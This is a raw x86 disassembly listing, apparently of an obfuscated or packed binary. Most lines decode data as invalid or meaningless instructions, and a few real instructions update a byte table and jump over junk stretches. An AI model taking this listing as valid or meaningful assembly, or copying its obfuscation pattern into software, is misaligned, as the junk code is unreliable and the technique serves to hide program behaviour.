  412c59:	in     eax,0x47
  412c5b:	jb     0x412c4f
  412c5d:	push   ecx
  412c5e:	push   0xe7310521
  412c63:	je     0x412c8f
  412c65:	or     DWORD PTR [ecx],ecx
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [eax],edx
  412c83:	push   ebx
  412c84:	pusha  
  412c85:	xchg   esp,eax
  412c86:	cld    
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412cc4
  412c8f:	xor    ebp,DWORD PTR [edx-0x77]
  412c92:	push   ebx
  412c93:	inc    ebx
  412c94:	inc    eax
  412c95:	stos   BYTE PTR es:[edi],al
  412c96:	jmp    0xd7be:0x9ade5a0f
  412c9d:	test   BYTE PTR [ecx+0x39],bl
  412ca0:	mov    bh,bh
  412ca2:	pop    ds
  412ca3:	imul   DWORD PTR [edi-0x57]
  412ca6:	push   0xffffffa2
  412ca8:	mov    edx,DWORD PTR [eax-0x75]
  412cab:	test   esp,ebp
  412cad:	aaa    
  412cae:	sub    dh,ch
  412cb0:	adc    bh,BYTE PTR [ecx+0x67246b2b]
  412cb6:	and    ebx,DWORD PTR [eax+0x640f931c]
  412cbc:	pop    ebx
  412cbd:	or     eax,esi
  412cbf:	jge    0x412cc4
  412cc1:	cmp    DWORD PTR [ebp-0x186512d7],0x33
  412cc8:	(bad)  
  412cc9:	mov    eax,0x80ef6ec4
  412cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ccf:	std    
  412cd0:	and    DWORD PTR es:[esi+ecx*1],ecx
  412cd4:	ds adc eax,0xd9927d27
  412cda:	inc    ebx
  412cdb:	add    ah,ah
  412cdd:	and    eax,0xe8986447
  412ce2:	xor    al,0xde
  412ce4:	sbb    eax,0x28ba3a40
  412ce9:	push   0xb15caad
  412cee:	push   esp
  412cef:	loope  0x412d29
  412cf1:	mov    WORD PTR [ebx+0x31810b91],?
  412cf7:	aam    0xd1
  412cf9:	cmp    eax,0x831d2214
  412cfe:	push   cs
  412cff:	pop    esi
  412d00:	loopne 0x412ccb
  412d02:	push   esi
  412d03:	mov    edx,0x917a4e08
  412d08:	inc    ebx
  412d09:	jno    0x412cdf
  412d0b:	lahf   
  412d0c:	cmp    al,0x64
  412d0e:	icebp  
  412d0f:	gs aas 
  412d11:	pop    ebp
  412d12:	mov    ah,0x4a
  412d14:	shl    DWORD PTR [eax+0x10],0xc
  412d18:	xlat   BYTE PTR ds:[ebx]
  412d19:	div    al
  412d1b:	pusha  
  412d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d1d:	xchg   ecx,eax
  412d1e:	sub    esp,ebx
  412d20:	or     DWORD PTR [edx],ecx
  412d22:	jge    0x412d4b
  412d24:	sub    DWORD PTR [ebx-0x3e],esi
  412d27:	daa    
  412d28:	mov    esi,0xe726e9c0
  412d2d:	add    DWORD PTR [ecx-0x64],edi
  412d30:	xor    BYTE PTR [ebp-0x147afdfe],cl
  412d36:	scas   al,BYTE PTR es:[edi]
  412d37:	mov    edi,0xf9f4bd44
  412d3c:	aam    0xcb
  412d3e:	ret    0xf2de
  412d41:	fdiv   st,st(1)
  412d43:	aam    0xd0
  412d45:	cmp    al,0x4b
  412d47:	xlat   BYTE PTR ds:[ebx]
  412d48:	ror    BYTE PTR [ecx+edx*1+0x2f8a33f6],cl
  412d4f:	adc    DWORD PTR [eax+ebx*4],esi
  412d52:	rcl    DWORD PTR [eax-0x7a],1
  412d55:	jl     0x412dcd
  412d57:	mov    ebp,0x9e18876f
  412d5c:	and    BYTE PTR [eax],ch
  412d5e:	ret    0xd575
  412d61:	rcr    DWORD PTR [eax-0x1e],1
  412d64:	mov    al,0x22
  412d66:	lods   al,BYTE PTR ds:[esi]
  412d67:	(bad)  
  412d68:	std    
  412d69:	dec    ebp
  412d6b:	xor    al,0x92
  412d6d:	cmp    esi,edi
  412d6f:	push   ss
  412d70:	mov    BYTE PTR [esi+0x29],dh
  412d73:	inc    edx
  412d74:	mov    bl,0xf0
  412d76:	mov    eax,0x920de1df
  412d7b:	push   es
  412d7c:	xchg   esi,eax
  412d7d:	push   0x6c
  412d7f:	jl     0x412d3f
  412d81:	push   edi
  412d82:	pop    ds
  412d83:	and    BYTE PTR [ebx],cl
  412d85:	adc    BYTE PTR [esi-0x4a],bl
  412d88:	call   0x49c9aaf3
  412d8d:	pop    ecx
  412d8e:	cmc    
  412d8f:	jmp    0x412d3b
  412d91:	call   0xe3eb4ee4
  412d96:	dec    ebx
  412d97:	jno    0x412d8a
  412d99:	mov    ecx,0xbc76fda5
  412d9e:	mov    ecx,fs
  412da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da1:	addr16 push edi
  412da3:	sbb    BYTE PTR [ebp+0x73e4299e],al
  412da9:	mov    BYTE PTR [ecx+0x5690fca5],ah
  412daf:	cwde   
  412db0:	xchg   esp,eax
  412db1:	xchg   edx,eax
  412db2:	pop    esp
  412db3:	test   cl,bh
  412db5:	data16 lods al,BYTE PTR ds:[esi]
  412db7:	mov    al,0xd8
  412db9:	aaa    
  412dba:	xor    DWORD PTR [edi-0x15],edi
  412dbd:	xor    eax,0xaed12f6a
  412dc2:	popf   
  412dc3:	jo     0x412db2
  412dc5:	into   
  412dc6:	loopne 0x412ddf
  412dc8:	sub    edi,edi
  412dca:	lods   eax,DWORD PTR ds:[esi]
  412dcb:	add    ecx,edx
  412dcd:	loope  0x412dca
  412dcf:	(bad)  
  412dd0:	pop    eax
  412dd1:	js     0x412df8
  412dd3:	lock shl DWORD PTR [esi],cl
  412dd6:	and    bl,al
  412dd8:	sub    BYTE PTR [esi+0x64],ch
  412ddb:	xchg   esi,eax
  412ddc:	xor    DWORD PTR [esi+ecx*8-0x41],edi
  412de0:	hlt    
  412de1:	addr16 (bad) 
  412de3:	out    dx,ax
  412de5:	test   eax,0x77717b5f
  412dea:	cld    
  412deb:	inc    edi
  412dec:	loop   0x412dce
  412dee:	adc    al,0xf5
  412df0:	das    
  412df1:	icebp  
  412df2:	jns    0x412d77
  412df4:	rol    BYTE PTR [ecx+0x7f951182],0xb
  412dfb:	mov    ah,0xfe
  412dfd:	in     al,0x8c
  412dff:	sbb    eax,0x22dfbc59
  412e04:	ret    
  412e05:	sbb    al,BYTE PTR [ebx-0x6e]
  412e08:	jge    0x412e65
  412e0a:	cmp    al,0x16
  412e0c:	mov    bh,0xd9
  412e0e:	div    BYTE PTR [ecx]
  412e10:	call   0xff66:0x512d19f0
  412e17:	retf   
  412e18:	aad    0x96
  412e1a:	scas   eax,DWORD PTR es:[edi]
  412e1b:	jno    0x412dd9
  412e1d:	xchg   ebx,eax
  412e1e:	cdq    
  412e1f:	xor    al,0xbf
  412e21:	aam    0xdc
  412e23:	leave  
  412e24:	mov    edi,0x1d0eb1e6
  412e29:	mov    ds:0x94ddb28c,al
  412e2e:	lahf   
  412e2f:	bound  eax,QWORD PTR [ecx+ecx*1+0x5dd2581a]
  412e36:	cmp    eax,0xfffffffa
  412e39:	and    al,0x1a
  412e3b:	mov    bh,0x27
  412e3d:	jb     0x412e8f
  412e3f:	dec    esp
  412e40:	jl     0x412e40
  412e42:	jne    0x412e99
  412e44:	pushf  
  412e45:	fcom   QWORD PTR [ebx-0x66d74929]
  412e4b:	aas    
  412e4c:	sbb    eax,0x94b060ea
  412e51:	rol    DWORD PTR cs:[ebp+0x6a],cl
  412e55:	pushf  
  412e56:	retf   
  412e57:	mov    edi,DWORD PTR [ebp+0x1b7ff81]
  412e5d:	dec    eax
  412e5e:	hlt    
  412e5f:	xchg   esp,eax
  412e60:	loop   0x412eb8
  412e62:	je     0x412e7e
  412e64:	fstp   st(0)
  412e66:	scas   eax,DWORD PTR es:[edi]
  412e67:	in     eax,dx
  412e68:	rcr    DWORD PTR [ecx],cl
  412e6a:	cmp    eax,esp
  412e6c:	mov    esi,0xdd489ab6
  412e71:	or     cl,ah
  412e73:	fidivr DWORD PTR [bx+si-0x1a]
  412e77:	adc    ecx,edx
  412e79:	adc    al,0xea
  412e7b:	bound  eax,QWORD PTR [ecx+esi*8-0x32]
  412e7f:	push   esp
  412e80:	mov    al,0xd6
  412e82:	lods   al,BYTE PTR ds:[esi]
  412e83:	add    BYTE PTR [esi-0x34],bh
  412e86:	and    BYTE PTR [esi+0x69],dh
  412e89:	ins    BYTE PTR es:[edi],dx
  412e8a:	mul    BYTE PTR [ecx-0x7e]
  412e8d:	lock outs dx,DWORD PTR ds:[esi]
  412e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e91:	neg    DWORD PTR [ebx]
  412e93:	popa   
  412e94:	mov    al,ds:0x94a9e7c6
  412e99:	in     eax,0x21
  412e9b:	adc    eax,0x200e0528
  412ea0:	mov    bh,0x5d
  412ea2:	or     DWORD PTR [esi],ecx
  412ea4:	test   DWORD PTR [eax+0x25],ecx
  412ea7:	adc    eax,0x7949a1fa
  412eac:	imul   ecx,DWORD PTR [ebx-0x75],0x44
  412eb0:	not    BYTE PTR [eax]
  412eb2:	lea    edi,ds:0xbac506a3
  412eb8:	mov    ecx,0x928c11ee
  412ebd:	nop
  412ebe:	jp     0x412ee7
  412ec0:	test   eax,0xce33fd6a
  412ec5:	repz mov esp,0x7bd647b7
  412ecb:	(bad)
  412ece:	pushf  
  412ecf:	fldl2t 
  412ed1:	(bad)  
  412ed2:	daa    
  412ed3:	mov    eax,0x689fe56e
  412ed8:	cld    
  412ed9:	add    DWORD PTR [edx],esp
  412edb:	dec    eax
  412edc:	dec    eax
  412edd:	fnsave [edi-0x22d75edf]
  412ee3:	lods   al,BYTE PTR ds:[esi]
  412ee4:	dec    ebx
  412ee5:	jno    0x412eaf
  412ee7:	test   BYTE PTR [ebp-0xeb59897],dl
  412eed:	mov    ebp,0xeb09daa5
  412ef2:	jno    0x412eb2
  412ef4:	(bad)  
  412ef5:	stos   BYTE PTR es:[edi],al
  412ef6:	mov    bl,0x67
  412ef8:	adc    ecx,DWORD PTR [eax+0x558b0f55]
  412efe:	hlt    
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0xf
  412f26:	sar    BYTE PTR [edi-0x4d],cl
  412f29:	imul   esi,DWORD PTR [ebp+0x78],0x787ee578
  412f30:	js     0x412f29
  412f32:	ret    0x7499
  412f35:	lock ret 0x4010
  412f39:	arpl   WORD PTR [edi+0x8b9374d],sp
  412f3f:	add    bh,BYTE PTR [edx+0x1427bd09]
  412f45:	cdq    
  412f46:	cmp    DWORD PTR [ecx],0xffffffb4
  412f49:	jns    0x412fc7
  412f4b:	inc    eax
  412f4c:	mov    esi,DWORD PTR [esi-0x2f]
  412f4f:	clc    
  412f50:	aaa    
  412f51:	addr16 or al,0x13
  412f54:	fdivr  st,st(5)
  412f56:	loop   0x412efb
  412f58:	jb     0x412f2b
  412f5a:	(bad)  
  412f5b:	(bad)  
  412f5c:	stc    
  412f5d:	mov    dh,0xc0
  412f5f:	lahf   
  412f60:	inc    esi
  412f61:	fcom   QWORD PTR [esi]
  412f63:	(bad)  
  412f65:	xchg   ebx,eax
  412f66:	mov    edx,0x6a62010
  412f6b:	inc    ecx
  412f6c:	jns    0x412f55
  412f6e:	in     al,dx
  412f6f:	loopne 0x412f8f
  412f71:	mov    cl,0x27
  412f73:	into   
  412f74:	jp     0x412f44
  412f76:	xor    eax,0x9fde4128
  412f7b:	rcl    BYTE PTR [esi-0x3fc919fc],1
  412f81:	lods   eax,DWORD PTR ds:[esi]
  412f82:	adc    BYTE PTR [ecx],dh
  412f84:	jne    0x412f53
  412f86:	pushf  
  412f87:	xor    DWORD PTR [ecx-0x4b2f7866],edi
  412f8d:	daa    
  412f8e:	cmp    cl,ch
  412f90:	sti    
  412f91:	sub    edx,DWORD PTR [edi+0x24b2f7cc]
  412f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f98:	lds    ebp,FWORD PTR [edi-0xe]
  412f9b:	add    ebx,DWORD PTR [eax]
  412f9d:	adc    esi,ebp
  412f9f:	and    BYTE PTR [eax],ah
  412fa1:	imul   eax,DWORD PTR [esi+0xa],0xffffff99
  412fa5:	pop    edi
  412fa6:	enter  0x8d70,0xb0
  412faa:	inc    esp
  412fab:	aad    0x78
  412fad:	or     bl,dl
  412faf:	add    DWORD PTR [esi+0x4e],0xee765c3e
  412fb6:	fcomp  DWORD PTR [edi-0x85505a7]
  412fbc:	dec    esi
  412fbd:	stos   DWORD PTR es:[edi],eax
  412fbe:	ja     0x412f67
  412fc0:	xchg   DWORD PTR [ebx-0x6c],esp
  412fc3:	push   ecx
  412fc4:	dec    ecx
  412fc5:	xchg   ebp,eax
  412fc6:	fimul  WORD PTR [ebp+edx*4-0x61]
  412fca:	(bad)  
  412fcb:	cld    
  412fcc:	jle    0x413006
  412fce:	pushf  
  412fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fd0:	mov    esi,0x4be821e
  412fd5:	adc    al,0x18
  412fd7:	mov    cl,0xd6
  412fd9:	repz inc edi
  412fdb:	mov    cl,0x5
  412fdd:	sbb    ebx,ebx
  412fdf:	push   ds
  412fe0:	outs   dx,BYTE PTR ds:[esi]
  412fe1:	and    dl,ah
  412fe3:	or     eax,0x17046f3b
  412fe8:	stos   BYTE PTR es:[edi],al
  412fe9:	sub    dh,BYTE PTR [edx-0x55bdbce3]
  412fef:	int    0xf4
  412ff1:	xchg   BYTE PTR [ecx+edx*8],dl
  412ff4:	dec    eax
  412ff5:	xor    al,0x6c
  412ff7:	(bad)  
  412ff8:	sub    BYTE PTR [edx],ah
  412ffa:	jno    0x413018
  412ffc:	loop   0x412fb5
  412ffe:	inc    esi
  412fff:	aam    0x13
  413001:	push   edx
  413002:	std    
  413003:	dec    esi
  413004:	ret    
  413005:	pop    ss
  413006:	(bad)  [esi+eiz*2+0x4070a643]
  41300d:	lods   eax,DWORD PTR ds:[esi]
  41300e:	cdq    
  41300f:	outs   dx,BYTE PTR ds:[esi]
  413010:	add    esi,DWORD PTR [esi]
  413012:	cmp    dl,dl
  413014:	bound  eax,QWORD PTR [esi]
  413016:	data16 sub ch,BYTE PTR [esi+0x3e]
  41301a:	in     eax,0x9d
  41301c:	push   edx
  41301d:	icebp  
  41301e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41301f:	icebp  
  413020:	sub    al,ah
  413022:	mov    ecx,DWORD PTR [esi+0x2e]
  413025:	ja     0x413002
  413027:	cmp    BYTE PTR cs:[ebp+esi*2-0x5c6c3908],ch
  41302f:	or     ebx,edi
  413031:	inc    ebx
  413032:	push   esp
  413033:	fwait
  413034:	mov    al,0x4b
  413036:	icebp  
  413037:	je     0x41308e
  413039:	imul   edx,ebp,0xffffffc7
  41303c:	sbb    BYTE PTR [ecx],dh
  41303e:	sub    al,0xd9
  413040:	sbb    ch,dh
  413042:	sub    al,0x2e
  413044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413045:	clc    
  413046:	clc    
  413047:	popf   
  413048:	add    al,0xe6
  41304a:	inc    edx
  41304b:	out    0x23,al
  41304d:	ss jl  0x412fea
  413050:	sub    ecx,edi
  413052:	jmp    0x3b59:0x77c63693
  413059:	and    DWORD PTR [edi-0x7ec97130],edx
  41305f:	loopne 0x413025
  413061:	xor    DWORD PTR [edx-0x6d8d8521],eax
  413067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413068:	test   al,0xdd
  41306a:	xor    al,0x63
  41306c:	adc    al,0xde
  41306e:	fidivr DWORD PTR [ebx-0x28]
  413071:	test   eax,0xdfea43bb
  413076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413077:	repz cmp BYTE PTR [ecx+edi*2+0x0],0x20
  41307d:	push   edi
  41307e:	int    0x39
  413080:	jp     0x413027
  413082:	pop    es
  413083:	add    eax,esi
  413085:	leave  
  413086:	addr16 inc eax
  413088:	lea    edi,[eax+0x44]
  41308b:	cmc    
  41308c:	xor    DWORD PTR [eax],0x2c586111
  413092:	xchg   esi,eax
  413093:	push   edx
  413094:	ins    BYTE PTR es:[edi],dx
  413095:	int3   
  413096:	mov    ch,0x25
  413098:	push   esi
  413099:	and    eax,0xb818399
  41309e:	push   es
  41309f:	and    al,0xe2
  4130a1:	lds    edi,FWORD PTR [ecx+0x33]
  4130a4:	out    dx,eax
  4130a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130a6:	mov    bh,dh
  4130a8:	adc    DWORD PTR [ebx+0x14],edx
  4130ab:	and    al,0xd0
  4130ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130ae:	and    al,0x76
  4130b0:	sbb    al,0x94
  4130b2:	lahf   
  4130b3:	xchg   ecx,eax
  4130b4:	imul   esi,DWORD PTR [ebx],0x8139bc69
  4130ba:	cwde   
  4130bb:	inc    esi
  4130bc:	sub    al,0x4
  4130be:	inc    esi
  4130bf:	push   ecx
  4130c0:	push   eax
  4130c1:	imul   ebx,ecx,0xc1fc5976
  4130c7:	sub    esi,ebp
  4130c9:	stos   DWORD PTR es:[edi],eax
  4130ca:	mov    ah,0x3
  4130cc:	or     BYTE PTR [ecx-0x2d573db7],bl
  4130d2:	xchg   DWORD PTR [esi],ecx
  4130d4:	adc    al,0x7f
  4130d6:	bound  esp,QWORD PTR [edi+0x7949e31]
  4130dc:	imul   esp,DWORD PTR [ebx],0xffffffb8
  4130df:	push   es
  4130e0:	pop    edi
  4130e1:	(bad)  
  4130e2:	pop    eax
  4130e3:	lods   eax,DWORD PTR ds:[esi]
  4130e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e5:	inc    eax
  4130e6:	xor    BYTE PTR [eax],bh
  4130e8:	addr16 fs je 0x4130b8
  4130ec:	sub    DWORD PTR [edi-0x5c],ebp
  4130ef:	and    dl,BYTE PTR [ebp-0x10]
  4130f2:	int3   
  4130f3:	jno    0x4130b2
  4130f5:	adc    dl,BYTE PTR [ecx+0x562d4cc3]
  4130fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130fc:	push   0x1c626562
  413101:	and    eax,0x80f7c29
  413106:	fs sahf 
  413108:	js     0x41313e
  41310a:	cmp    DWORD PTR ss:[esi-0x69],eax
  41310e:	xor    esi,DWORD PTR [ebp-0x76]
  413111:	xchg   esp,eax
  413112:	aas    
  413113:	stc    
  413114:	sbb    al,BYTE PTR [esi+ecx*1]
  413117:	test   DWORD PTR [ebp-0x4ed04b5e],0xde8a1513
  413121:	cdq    
  413122:	rcl    DWORD PTR [ecx-0x78f1ab41],cl
  413128:	stos   BYTE PTR es:[edi],al
  413129:	xchg   edi,eax
  41312a:	cs mov edi,0x28754f6c
  413130:	iret   
  413131:	aam    0x22
  413133:	dec    eax
  413134:	in     al,0xb3
  413136:	cwde   
  413137:	mov    WORD PTR ds:0x51b7b588,fs
  41313d:	xchg   ecx,eax
  41313e:	xchg   BYTE PTR [ebp-0x6715e465],dh
  413144:	xchg   ecx,eax
  413145:	in     al,dx
  413146:	fadd   QWORD PTR [ebx-0x3e]
  413149:	push   ecx
  41314a:	cmp    ah,BYTE PTR [ebx]
  41314c:	inc    ebp
  41314d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41314e:	addr16 pop edi
  413150:	fcmovb st,st(2)
  413152:	pusha  
  413153:	or     dh,dh
  413155:	ins    BYTE PTR es:[edi],dx
  413156:	sub    esp,esi
  413158:	push   edi
  41315a:	mov    edi,0x94df2ff8
  41315f:	pop    edi
  413160:	mov    ds:0x3ed8938e,al
  413165:	fnstcw WORD PTR [esp+eax*1+0x27]
  413169:	sbb    ch,BYTE PTR [ebx]
  41316b:	push   ebx
  41316c:	push   ds
  41316d:	js     0x41315c
  41316f:	sahf   
  413170:	xchg   esi,eax
  413171:	out    dx,eax
  413172:	mov    cl,0x77
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	mov    bh,BYTE PTR [ebx]
  413177:	jp     0x41311e
  413179:	push   eax
  41317a:	add    al,0x9f
  41317c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41317d:	and    ebx,esi
  41317f:	lock and al,0x96
  413182:	stc    
  413183:	cwde   
  413184:	js     0x4131cb
  413186:	mov    eax,0x7105b11c
  41318b:	test   BYTE PTR [ecx+0x2e],dh
  41318e:	js     0x4131c9
  413190:	dec    eax
  413191:	mov    ch,0x75
  413193:	test   eax,0xfd817722
  413198:	push   esp
  413199:	retf   0xaca3
  41319c:	mov    edi,DWORD PTR [ebp-0xc]
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	imul   edi,DWORD PTR [eax+ebx*8-0x25],0xffffffd6
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x4131fc
  4131d4:	ds pusha 
  4131d6:	in     eax,dx
  4131d7:	sbb    al,BYTE PTR [edx]
  4131d9:	gs icebp 
  4131db:	cmp    DWORD PTR ds:0x425519f0,ebp
  4131e1:	mov    edx,eax
  4131e3:	sub    eax,0x1b19df02
  4131e8:	inc    esp
  4131e9:	jg     0x4131b0
  4131eb:	(bad)  
  4131ec:	repz sub al,0x60
  4131ef:	xchg   ebx,eax
  4131f0:	xchg   edi,eax
  4131f1:	sbb    BYTE PTR [edi+0x73],dh
  4131f4:	push   edi
  4131f5:	cwde   
  4131f6:	adc    ebp,esi
  4131f8:	mov    ebp,0x535c8b62
  4131fd:	pop    eax
  4131fe:	push   edi
  4131ff:	jg     0x4131fa
  413201:	imul   esi,DWORD PTR [edx-0x2e],0xb
  413205:	lock loope 0x4131f4
  413208:	mov    esp,edx
  41320a:	xchg   DWORD PTR ds:[edi+eiz*4-0x6e],ebp
  41320f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413210:	mov    esi,0x48b25b6d
  413215:	lods   al,BYTE PTR ds:[esi]
  413216:	mov    ecx,DWORD PTR [ecx-0x48]
  413219:	jg     0x413248
  41321b:	(bad)
  413220:	push   ss
  413221:	aam    0xb3
  413223:	push   esi
  413224:	ss sub al,0xdb
  413227:	ror    DWORD PTR [ebx],0x7
  41322a:	lea    eax,[edx+eiz*1]
  41322d:	sbb    al,BYTE PTR [ebp+0x1c32999d]
  413233:	inc    esi
  413234:	jae    0x413231
  413236:	jb     0x4131f6
  413238:	adc    al,0xc1
  41323a:	add    dl,0x33
  41323d:	pop    edx
  41323e:	call   0x3ecd:0x60bcf181
  413245:	aaa    
  413246:	test   BYTE PTR [eax+0x42],ch
  413249:	ins    DWORD PTR es:[edi],dx
  41324a:	psraw  mm3,QWORD PTR [ecx+0x1a562c10]
  413251:	sub    DWORD PTR [esi],esp
  413253:	push   ecx
  413254:	push   es
  413255:	or     eax,0xc483bf00
  41325a:	mov    ds:0x91e3eed3,al
  41325f:	xchg   ebp,eax
  413260:	sub    esi,DWORD PTR ds:0xff2390b5
  413266:	cmp    dh,bh
  413268:	push   ebx
  413269:	xor    al,0x81
  41326b:	sub    al,0x2b
  41326d:	push   edi
  41326e:	sub    al,0x83
  413270:	dec    ebx
  413271:	jae    0x41324f
  413273:	bound  ecx,QWORD PTR [eax]
  413275:	and    al,0xd2
  413277:	out    0x39,al
  413279:	mov    ?,WORD PTR [edi]
  41327b:	fwait
  41327c:	inc    ebp
  41327d:	jb     0x413294
  41327f:	popa   
  413280:	loop   0x4132ce
  413282:	xchg   ebp,eax
  413283:	fisubr WORD PTR [edx+eax*1]
  413286:	shr    DWORD PTR [ebp+0xc],cl
  413289:	dec    ecx
  41328a:	cli    
  41328b:	mov    ebp,0x7c4b8d55
  413290:	xor    al,0x59
  413292:	arpl   ax,di
  413294:	in     eax,0x4b
  413296:	add    dh,bh
  413298:	(bad)  [ebp+0x59e5e932]
  41329e:	jmp    0x41329a
  4132a0:	cwde   
  4132a1:	scas   al,BYTE PTR es:[edi]
  4132a2:	cmp    DWORD PTR [edi+0x59],eax
  4132a5:	ds das 
  4132a7:	adc    dh,ch
  4132a9:	or     bl,BYTE PTR [eax+0x7007c352]
  4132af:	add    BYTE PTR [esi],cl
  4132b1:	xchg   BYTE PTR [ebx-0x761aaf31],ah
  4132b7:	push   ebx
  4132b8:	inc    ebx
  4132b9:	bnd je 0x41325d
  4132bc:	test   BYTE PTR [ebx-0x6f12d36d],bl
  4132c2:	sbb    eax,0xebec086e
  4132c7:	sub    BYTE PTR [esi+0x5],ch
  4132ca:	pop    es
  4132cb:	inc    ebx
  4132cc:	das    
  4132cd:	(bad)  
  4132ce:	loope  0x4132fa
  4132d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132d1:	repz retfw 
  4132d4:	sub    esp,DWORD PTR [esi]
  4132d6:	jo     0x4132a4
  4132d8:	sub    ecx,eax
  4132da:	push   ss
  4132db:	dec    ebx
  4132dc:	xchg   DWORD PTR [ebp+edi*1+0x7d],esi
  4132e0:	cli    
  4132e1:	hlt    
  4132e2:	jne    0x41328d
  4132e4:	(bad)  
  4132e5:	cmp    dl,BYTE PTR [eax+edx*2-0x389930ed]
  4132ec:	(bad)  
  4132ed:	ds mov al,0x2d
  4132f0:	cwde   
  4132f1:	sar    DWORD PTR [ebp-0x4b6d2f0b],0x12
  4132f8:	cli    
  4132f9:	push   ebx
  4132fa:	pop    es
  4132fb:	xor    bh,ah
  4132fd:	fisttp QWORD PTR [edx-0x5de41093]
  413303:	inc    edi
  413304:	(bad)  
  413305:	push   0x9d50dbec
  41330a:	jno    0x413316
  41330c:	in     al,dx
  41330d:	mov    bl,0xfc
  41330f:	outs   dx,WORD PTR ds:[esi]
  413311:	dec    ebx
  413312:	xor    ebx,edx
  413314:	loop   0x41336c
  413316:	lods   al,BYTE PTR ds:[esi]
  413317:	pushf  
  413318:	mov    esi,0x5ec52020
  41331d:	sar    BYTE PTR [eax+ebx*2+0x43278a45],0x5d
  413325:	and    DWORD PTR [eax+0x1b34b8ba],ebp
  41332b:	sbb    dh,cl
  41332d:	jmp    0x3f56:0xd55402d8
  413334:	mov    eax,0xa38778ce
  413339:	mov    ah,0xa5
  41333b:	test   eax,0x8dfd1d57
  413340:	push   edx
  413341:	fldenv [edx+0x44702f6b]
  413347:	ds test eax,0xe335d6a0
  41334d:	push   ebp
  41334e:	aas    
  41334f:	imul   ecx,DWORD PTR [esp+ecx*2-0x6e],0x11
  413354:	push   ecx
  413355:	push   ebp
  413356:	pop    edx
  413357:	ja     0x413387
  413359:	sub    BYTE PTR [ebx-0x35],cl
  41335c:	rcr    BYTE PTR [ecx-0x2b6c7072],cl
  413362:	call   0xee23:0x78f9d768
  413369:	enter  0x89d9,0xbc
  41336d:	or     esi,DWORD PTR [eax-0x78]
  413370:	jmp    0x516a09b9
  413375:	add    dl,BYTE PTR [edi-0x36]
  413378:	pop    ss
  413379:	cmp    ch,ch
  41337b:	dec    edx
  41337c:	fwait
  41337d:	jns    0x4133c2
  41337f:	and    edx,esi
  413381:	lock jle 0x4133af
  413384:	in     eax,0xa9
  413386:	cmp    DWORD PTR ds:0xaf7cfeaf,edx
  41338c:	adc    ebp,edi
  41338e:	hlt    
  41338f:	or     eax,0x9915d8c4
  413394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413395:	fldenv [esi+0x3eff9c82]
  41339b:	retf   
  41339c:	xlat   BYTE PTR ds:[ebx]
  41339d:	fsub   QWORD PTR [ebx]
  41339f:	pushf  
  4133a0:	xchg   edx,eax
  4133a1:	jle    0x41334b
  4133a3:	aaa    
  4133a4:	sbb    edx,eax
  4133a6:	sbb    DWORD PTR [edi+0x3c],ebp
  4133a9:	shl    ecx,1
  4133ab:	sub    dl,BYTE PTR [eax-0x71fe6202]
  4133b1:	lahf   
  4133b2:	(bad)  
  4133b3:	clc    
  4133b4:	cmp    DWORD PTR [edi],ecx
  4133b6:	and    BYTE PTR [eax-0x9],bl
  4133b9:	cmp    DWORD PTR [ebx-0x61ce819b],ebp
  4133bf:	faddp  st(4),st
  4133c1:	dec    esi
  4133c2:	rcl    al,0xdb
  4133c5:	fsub   st,st(4)
  4133c7:	mov    eax,ds:0xdbdedd7c
  4133cc:	pop    ds
  4133cd:	and    BYTE PTR [ebx],bh
  4133cf:	std    
  4133d0:	test   eax,0x8b00e301
  4133d5:	or     dl,BYTE PTR [edi+ebp*8]
  4133d8:	ror    cl,1
  4133da:	dec    esp
  4133db:	mov    esp,0x947c889c
